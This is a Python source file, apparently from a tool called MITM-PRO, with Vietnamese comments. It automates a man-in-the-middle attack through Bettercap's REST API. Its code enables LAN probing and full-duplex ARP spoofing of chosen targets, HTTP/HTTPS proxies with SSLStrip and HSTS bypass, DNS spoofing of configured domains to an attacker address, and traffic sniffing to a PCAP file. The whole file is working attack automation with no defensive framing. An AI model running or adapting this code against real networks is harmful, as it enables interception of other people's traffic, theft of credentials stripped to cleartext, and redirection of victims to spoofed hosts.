#!/usr/bin/env python3
"""
MITM-PRO v5.0 — Bettercap Engine
Wrapper gọi Bettercap qua REST API + subprocess.
Quản lý: khởi động, gửi lệnh, theo dõi trạng thái, dừng.
"""

import logging
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

import requests
from requests.auth import HTTPBasicAuth

from utils.config import Config, State


class BettercapEngine:
    """
    Giao tiếp với Bettercap qua REST API.
    Flow: start_process() → wait_api_ready() → run_command() / setup_modules() → stop()
    """

    def __init__(self, cfg: Config, state: State):
        self.cfg = cfg
        self.state = state
        self.proc: Optional[subprocess.Popen] = None
        self.base_url = f"http://{cfg.api_host}:{cfg.api_port}"
        self.auth = HTTPBasicAuth(cfg.api_user, cfg.api_pass)
        self._session = requests.Session()
        self._session.auth = self.auth

    # ─── Khởi động / Dừng Bettercap ─────────────────────────────────

    def start_process(self) -> subprocess.Popen:
        """Khởi động bettercap chạy nền với REST API."""
        if shutil.which("bettercap") is None:
            raise FileNotFoundError("Không tìm thấy bettercap trong PATH")

        eval_cmd = "; ".join([
            f"set api.rest.address {self.cfg.api_host}",
            f"set api.rest.port {self.cfg.api_port}",
            f"set api.rest.username {self.cfg.api_user}",
            f"set api.rest.password {self.cfg.api_pass}",
            "api.rest on",
        ])

        cmd = [
            "bettercap",
            "-iface", self.state.iface,
            "-eval", eval_cmd,
            "-silent",
        ]

        log_path = self.cfg.output_dir / "bettercap_stdout.log"
        self._log_path = log_path
        self._log_fd = open(log_path, "w")  # giữ reference để đóng khi stop()

        logging.info(f"🚀 Khởi động bettercap trên {self.state.iface}...")
        self.proc = subprocess.Popen(
            cmd, stdout=self._log_fd, stderr=subprocess.STDOUT
        )
        self.state.bettercap_running = True
        logging.info(f"   PID: {self.proc.pid} | API: {self.base_url}")
        
        # Đợi một chút để bettercap khởi động hoàn toàn
        time.sleep(2)
        return self.proc

    def wait_api_ready(self, timeout: int = 30) -> bool:
        """Chờ REST API sẵn sàng, đồng thời fail sớm nếu bettercap chết trước."""
        logging.info("⏳ Chờ Bettercap API sẵn sàng...")
        deadline = time.time() + timeout
        attempt = 0
        while time.time() < deadline:
            attempt += 1
            
            # Kiểm tra process còn sống không
            if self.proc is not None and self.proc.poll() is not None:
                exit_code = self.proc.poll()
                logging.error(f"❌ Bettercap đã thoát với mã {exit_code} trước khi REST API sẵn sàng")
                self._log_early_failure()
                return False
            
            try:
                r = self._session.get(f"{self.base_url}/api/session", timeout=3)
                if r.status_code == 200:
                    logging.info(f"✅ Bettercap API đã sẵn sàng (sau {attempt} lần thử)")
                    return True
                elif r.status_code == 401:
                    logging.error("❌ Lỗi xác thực API - username/password không đúng")
                    return False
                else:
                    logging.debug(f"API trả về status {r.status_code}, thử lại...")
            except requests.ConnectionError:
                # API chưa sẵn sàng, tiếp tục retry
                pass
            except requests.exceptions.Timeout:
                logging.debug(f"Timeout lần {attempt}, thử lại...")
            except Exception as e:
                logging.debug(f"Lỗi khi kiểm tra API: {e}")
            
            time.sleep(1)
        
        logging.error(f"❌ Bettercap API không phản hồi sau {timeout}s")
        self._log_early_failure()
        return False

    def _log_early_failure(self, lines: int = 20):
        """In ra vài dòng cuối của bettercap log để dễ debug khi startup fail."""
        try:
            log_path = getattr(self, "_log_path", None)
            if not log_path:
                return
            path = Path(log_path)
            if not path.exists():
                return
            content = path.read_text(encoding="utf-8", errors="ignore").splitlines()
            tail = content[-lines:]
            if tail:
                logging.error("❌ Bettercap startup log:")
                for line in tail:
                    logging.error(f"   {line}")
        except Exception:
            pass

    def stop(self):
        """Dừng bettercap an toàn: tắt module rồi đóng log file."""
        if self.proc is None:
            return
        # Thử tắt từng module trước khi kill process
        for cmd in ("arp.spoof off", "http.proxy off", "https.proxy off",
                    "net.sniff off", "net.probe off", "dns.spoof off"):
            try:
                self.run_command(cmd)
            except Exception:
                pass
        self.state.bettercap_running = False
        # Đóng file handle log
        try:
            if hasattr(self, "_log_fd") and self._log_fd:
                self._log_fd.close()
        except Exception:
            pass

    # ─── REST API helpers ────────────────────────────────────────────

    def run_command(self, cmd: str) -> Optional[Dict[str, Any]]:
        """Gửi lệnh tới Bettercap REST API, trả về JSON hoặc None."""
        try:
            r = self._session.post(
                f"{self.base_url}/api/session",
                json={"cmd": cmd},
                timeout=10,
            )
            if r.status_code == 200:
                return r.json() if r.text.strip() else {}
            logging.warning(f"⚠️ Bettercap trả về {r.status_code} cho lệnh: {cmd}")
        except Exception as e:
            logging.warning(f"⚠️ Lỗi gửi lệnh '{cmd}': {e}")
        return None

    def get_session(self) -> Optional[Dict[str, Any]]:
        """Lấy thông tin session hiện tại."""
        try:
            r = self._session.get(f"{self.base_url}/api/session", timeout=5)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def get_events(self, count: int = 50) -> List[Dict]:
        """Lấy event log gần nhất từ bettercap.
        API trả về {"events": [...]} — phải unpack trước khi dùng.
        """
        try:
            r = self._session.get(
                f"{self.base_url}/api/events",
                params={"n": count},
                timeout=5,
            )
            if r.status_code == 200:
                data = r.json()
                # Bettercap trả về {"events": [...]} hoặc trực tiếp []
                if isinstance(data, dict):
                    return data.get("events", [])
                if isinstance(data, list):
                    return data
        except Exception:
            pass
        return []

    # ─── Cấu hình module ─────────────────────────────────────────────

    def setup_modules(self):
        """Bật các module theo cấu hình trong Config."""
        logging.info("⚙️  Cấu hình module bettercap...")

        # --- Net probe (quét mạng nội bộ) ---
        self.run_command("net.probe on")
        time.sleep(1)

        # --- ARP Spoof ---
        if self.cfg.arp_spoof:
            self._setup_arp_spoof()

        # --- HTTPS Proxy + SSLStrip ---
        if self.cfg.https_proxy:
            self._setup_https_proxy()

        # --- DNS Spoof ---
        if self.cfg.dns_spoof:
            self._setup_dns_spoof()

        # --- PCAP capture (qua bettercap net.sniff) ---
        if self.cfg.pcap:
            self._setup_pcap()

        logging.info("✅ Đã cấu hình xong tất cả module")

    def _setup_arp_spoof(self):
        """Cấu hình ARP spoofing bidirectional."""
        targets_str = ", ".join(self.state.targets)
        logging.info(f"🔴 ARP Spoof → gateway={self.state.gw} | targets={targets_str}")

        self.run_command(f"set arp.spoof.targets {targets_str}")
        self.run_command("set arp.spoof.fullduplex true")     # bidirectional
        self.run_command("set arp.spoof.internal false")

        # Điều chỉnh tốc độ theo mode
        # Bettercap không có flag interval ARP trực tiếp qua API,
        # nhưng ta có thể kiểm soát bằng ticker nếu cần mở rộng.

        self.run_command("arp.spoof on")
        logging.info("   ✅ ARP Spoof ON (full-duplex)")

    def _setup_https_proxy(self):
        """Bật HTTP/HTTPS proxy + SSLStrip / HSTS bypass."""
        logging.info("🔐 HTTPS Proxy + SSLStrip...")

        self.run_command("set http.proxy.sslstrip true")
        self.run_command("set https.proxy.sslstrip true")

        # Bật net.sniff trước (để bắt cleartext sau sslstrip)
        self.run_command("http.proxy on")
        self.run_command("https.proxy on")
        logging.info("   ✅ HTTP/HTTPS Proxy ON (SSLStrip enabled)")

    def _setup_dns_spoof(self):
        """Bật DNS spoofing nếu được cấu hình."""
        if not self.cfg.dns_domains or not self.cfg.dns_address:
            logging.warning("⚠️ DNS Spoof bật nhưng thiếu dns_domains / dns_address — bỏ qua")
            return

        logging.info(f"🌐 DNS Spoof: {self.cfg.dns_domains} → {self.cfg.dns_address}")
        self.run_command(f"set dns.spoof.domains {self.cfg.dns_domains}")
        self.run_command(f"set dns.spoof.address {self.cfg.dns_address}")
        self.run_command("dns.spoof on")
        logging.info("   ✅ DNS Spoof ON")

    def _setup_pcap(self):
        """Bật bắt gói tin (net.sniff) ghi ra PCAP."""
        pcap_path = str(self.cfg.pcap_file)
        logging.info(f"📡 PCAP capture → {pcap_path}")
        self.run_command(f"set net.sniff.output {pcap_path}")
        self.run_command("set net.sniff.verbose true")
        self.run_command("net.sniff on")
        logging.info("   ✅ Net Sniff ON")

    # ─── Truy vấn trạng thái ─────────────────────────────────────────

    def get_lan_hosts(self) -> List[Dict]:
        """Lấy danh sách host bettercap đã thấy trên LAN."""
        session = self.get_session()
        if session and "lan" in session:
            return session["lan"].get("hosts", [])
        return []

    def get_arp_spoof_targets(self) -> List[str]:
        """Lấy danh sách target đang bị poison (từ session)."""
        session = self.get_session()
        if not session:
            return []
        # Bettercap trả về thông tin trong modules
        try:
            for mod in session.get("modules", []):
                if mod.get("name") == "arp.spoof" and mod.get("running"):
                    return [t.strip() for t in
                            mod.get("parameters", {}).get("arp.spoof.targets", {}).get("value", "").split(",")
                            if t.strip()]
        except Exception:
            pass
        return self.state.targets

    def is_alive(self) -> bool:
        """Kiểm tra bettercap còn chạy không."""
        if self.proc is None:
            return False
        return self.proc.poll() is None
